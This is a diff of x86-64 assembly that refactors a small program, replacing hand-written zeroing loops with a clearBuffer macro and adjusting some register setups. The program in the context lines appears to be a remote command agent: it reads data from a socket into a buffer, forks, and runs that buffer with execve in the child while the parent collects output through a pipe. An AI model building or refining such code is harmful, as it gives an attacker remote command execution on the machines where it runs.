@@ -1,3 +1,12 @@
+%macro clearBuffer 1
+  mov     rcx,    0
+%%_ne:
+  mov     QWORD [%1 + rcx], 0
+  add     rcx,    8
+  cmp     rcx,    256
+  jne     %%_ne
+%endmacro
+
 section .text
   global _start
 
@@ -12,8 +21,8 @@ _start:
 _request:
   ; socket()
   mov     rax,    41
-  mov     rdi,    2
-  mov     rsi,    1
+  mov     edi,    2
+  mov     esi,    1
   xor     rdx,    rdx
   syscall
 
@@ -32,12 +41,7 @@ _request:
   mov     rdx,    0x400
   syscall
 
-  mov     rcx,    0
-_loop1:
-  mov     QWORD [msgbuf + rcx], 0
-  add     rcx,    8
-  cmp     rcx,    256
-  jne     _loop1
+  clearBuffer msgbuf
 
   ; read response
   mov     rax,    0
@@ -64,12 +68,7 @@ _parentProc:
   mov     rdi,    [fds+4]
   syscall
 
-  mov     rcx,    0
-_loop:
-  mov     QWORD [output + rcx], 0
-  add     rcx,    8
-  cmp     rcx,    256
-  jne     _loop
+  clearBuffer output
 
   ; read()
   mov     rax,    0
@@ -114,8 +113,8 @@ _childProc:
   ; execve()
   mov     rax,    59
   mov     rdi,    msgbuf
-  mov     rsi,    0
-  mov     rdx,    0
+  xor     rsi,    rsi
+  xor     rdx,    rdx
   syscall
 
   ; wait4()
